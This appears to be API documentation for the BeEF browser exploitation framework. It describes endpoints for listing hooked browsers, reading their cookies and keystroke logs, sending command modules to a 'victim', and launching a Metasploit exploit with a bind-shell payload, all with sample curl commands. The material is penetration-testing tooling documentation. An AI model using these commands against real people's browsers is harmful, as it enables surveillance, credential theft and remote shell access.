## Introduction
From version 0.4.3.3 BeEF exposes a RESTful API. All the exchanged data uses the JSON format, for both HTTP responses and HTTP POST requests that have a body. In order to use the API, a _token_ parameter must be always added to requests, otherwise a 401 error (Not Authorized) is returned.

The pseudo-random token is newly generated every time BeEF starts, using `BeEF::Core::Crypto::api_token` 
and is then added to the _BeEF::Configuration_ object. It can be retrieved at any time via ruby using `BeEF::Core::Configuration.instance.get('beef.api_token')`

When BeEF starts, look at the console output for 
`[16:02:47][*] RESTful API key: 320f3cf4da7bf0df7566a517c5db796e73a23f47`. That will be the value of the _token_ parameter
## Hooked Browsers
**Handler** => /api/hooks
The _hooks_ handler gives information about the hooked browsers, both online and offline.

**Request** => GET /api/hooks

`curl http://beefserver.com:3000/api/hooks?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`

**Response**

```json
{
    "hooked-browsers": {
        "online": {
            "0": {
                "name": "FF",
                "version": "10",
                "os": "Intel Mac OS X 10.7",
                "platform": "MacIntel",
                "session": "nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk",
                "ip": "127.0.0.1",
                "domain": "127.0.0.1",
                "port": "3000",
                "page_uri": "http://127.0.0.1:3000/demos/basic.html"
            }
        },
        "offline": {
            "0": {
                "name": "C",
                "version": "17",
                "os": "Macintosh",
                "platform": "MacIntel",
                "session": "26bxiMKoFfOeBgcvIV84qeOsEULKQIEYDH4djMbMPeoAZU4yySMIlJJ7GrAMwuMa0eX9wCKk24KOsCoT",
                "ip": "127.0.0.1",
                "domain": "127.0.0.1",
                "port": "3000",
                "page_uri": "http://127.0.0.1:3000/demos/basic.html"
}}}}
```
In order to retrieve relative hooked browser details (like enabled plugins and technologies, cookies, screen size and additional info), we must specify the unique session id that identified the browser in the BeEF framework. This information can be found from the previous _/api/hooks_ call: the _session_ key value.

**Request** => GET /api/hooks/:session

`curl http://beefserver.com:3000/api/hooks/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`

**Response (snip)**

```json
{ "BrowserName" : "O",
  "BrowserPlugins" : "Shockwave Flash\nJava Applet Plug-in\nQuickTime Plug-in 7.7.1\nSharePoint Browser Plug-in\nSilverlight Plug-In\nWebEx64 General Plugin Container",
  "BrowserReportedName" : "Opera/9.80 (Macintosh; Intel Mac OS X 10.7.3; U; en) Presto/2.10.229 Version/11.62",
  "BrowserType" : "{\"O11\":true,\"O\":true}",
  "BrowserVersion" : "11",
  "Cookies" : "BEEFHOOK=nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk",
  "HasActiveX" : "No",
  "HasFlash" : "Yes",
  "HasGoogleGears" : "No",
  "HasWebSocket" : "No",
  "HostName" : "127.0.0.1",
  "JavaEnabled" : "Yes",
  "OsName" : "Macintosh",
  "PageReferrer" : "No Referrer",
  "PageTitle" : "BeEF Basic Demo",
  "PageURI" : "http://127.0.0.1:3000/demos/basic.html",
  "ScreenParams" : "{\"width\"=>1680, \"height\"=>1050, \"colordepth\"=>32}",
  "SystemPlatform" : "MacIntel",
  "VBScriptEnabled" : "No",
  "WindowSize" : "{\"width\"=>1000, \"height\"=>729}",
  "hasPersistentCookies" : "Yes",
  "hasSessionCookies" : "Yes"
}
```

## Logs
**Handler** => /api/logs
The _logs_ handler gives information about hooked browser logs, both global and relative ones.

**Request** => GET /api/logs

`curl http://beefserver.com:3000/api/logs?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`

**Response (snip)**

```json
{
    "logs_count": 8,
    "logs": [
        {
            "id": 1,
            "date": "2012-03-20T16:14:11+01:00",
            "event": "127.0.0.1 just joined the horde from the domain: 127.0.0.1:3000",
            "type": "Zombie"
        },
        {
            "id": 8,
            "date": "2012-03-20T16:18:27+01:00",
            "event": "19.092s - [Focus] Browser has regained focus.",
            "type": "Event"
        }
    ]
}
```

In order to retrieve relative hooked browser logs, so events that are logged for a specific browser, we must specify the unique session id that identified the browser in the BeEF framework. This information can be found from the previous _/api/hooks_ call: the _session_ key value.

**Request** => GET /api/logs/:session

`curl http://beefserver.com:3000/api/logs/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`

**Response (snip)**

```json
{
    "logs_count": 13,
    "logs": [
        {
            "id": 1,
            "date": "2012-03-20T16:14:11+01:00",
            "event": "127.0.0.1 just joined the horde from the domain: 127.0.0.1:3000",
            "type": "Zombie"
        },
        {
            "id": 16,
            "date": "2012-03-20T16:40:18+01:00",
            "event": "6.071s - [User Typed] "an" > input#imptxt(Important Text)",
            "type": "Event"
        },
        {
            "id": 17,
            "date": "2012-03-20T16:40:19+01:00",
            "event": "7.086s - [User Typed] "tisnatc" > input#imptxt(Important Text)",
            "type": "Event"
        },
        {
            "id": 18,
            "date": "2012-03-20T16:40:20+01:00",
            "event": "8.099s - [User Typed] "hor" > input#imptxt(Important Text)",
            "type": "Event"
        }
    ]
}
```
## Command Modules
**Handler** => /api/modules
The _modules_ handler do multiple things:

**===List all available and enabled command modules===**

**Request** => GET /api/modules

`curl http://beefserver.com:3000/api/modules?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`

**Response (snip)**

```json
{
    "0": {
        "id": 1,
        "name": "Linksys WRT54G CSRF",
        "category": "Router"
    },
    "65": {
        "id": 69,
        "name": "Redirect Browser (Rickroll)",
        "category": "Browser"
    },
    "66": {
        "id": 70,
        "name": "Replace Videos",
        "category": "Browser"
    },
    "67": {
        "id": 71,
        "name": "Create Prompt Dialog",
        "category": "Browser"
    }
}
```
**===Return information about a specified module (description, category, input options)===**

**Request** => GET /api/modules/:module_id

`curl http://beefserver.com:3000/api/modules/71?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`

**Response**

```json
{
    "name": "prompt_dialog",
    "description": "Sends a prompt dialog to the hooked browser.",
    "category": "Browser",
    "options": [
        {
            "name": "question",
            "description": "Prompt text",
            "ui_label": "Prompt text"
        }
    ]
}
```
**===Send a command module to the specified hooked browser===**

NOTE: the request header must contain `Content-Type: application/json; charset=UTF-8` and the request body must be valid JSON. In the following example we send the _prompt-dialog_ command module: according to the previous _/api/modules/71_ call, we can specify the _question_ input with our custom value. 

**Request** => POST /api/modules/:session/:module_id

`curl -H "Content-Type: application/json; charset=UTF-8" -d '{"question":"wtf?"}' -X POST http://beefserver.com:3000/api/modules/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk/71?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`

**Response**

```json
{
    "success": "true",
    "command_id": "1"
}
```
**===Return information about the specific command module previously executed===**

Reusing the previous example, we want to know the command module execution results (or, what the victim entered to the prompt dialog). In this case the victim entered _don't know_ :D

**Request** => GET /api/modules/:session/:mod_id/:cmd_id

`curl http://beefserver.com:3000/api/modules/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk/71/1?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`

**Response**

```json
{
    "date": "1332260323",
    "data": "{"data":"answer=don't know"}"
}
```
**===Send a Metasploit module===**

NOTE: the request header must contain `Content-Type: application/json; charset=UTF-8` and the request body must be valid JSON. In the following example we send the _Adobe FlateDecode Stream Predictor 02 Integer Overflow_. Metasploit modules will be listed together with BeEF modules, marked with the _metasploit_ category.

**Request** => POST /api/modules/:session/:module_id

`curl -H "Content-Type: application/json; charset=UTF-8" -d '{"SRVPORT":"3992", "URIPATH":"77345345345dg", "PAYLOAD":"generic/shell_bind_tcp"}' -X POST http://beefserver.com:3000/api/modules/nBK3BGBILYD0bNMC1IH299oDbZXNNXKfwMEoDwajmItAHhhhe8LLnEPvO3wFjg1rO4PzXsBbUAK1V0gk/236?token=320f3cf4da7bf0df7566a517c5db796e73a23f47`

**Response**

NOTE: in this case we cannot query BeEF nor Metasploit if module execution was successful or not.
This is why there is "command_id":"not_available" in the response.

```json
{
    "success": "true",
    "command_id": "not_available"
}
```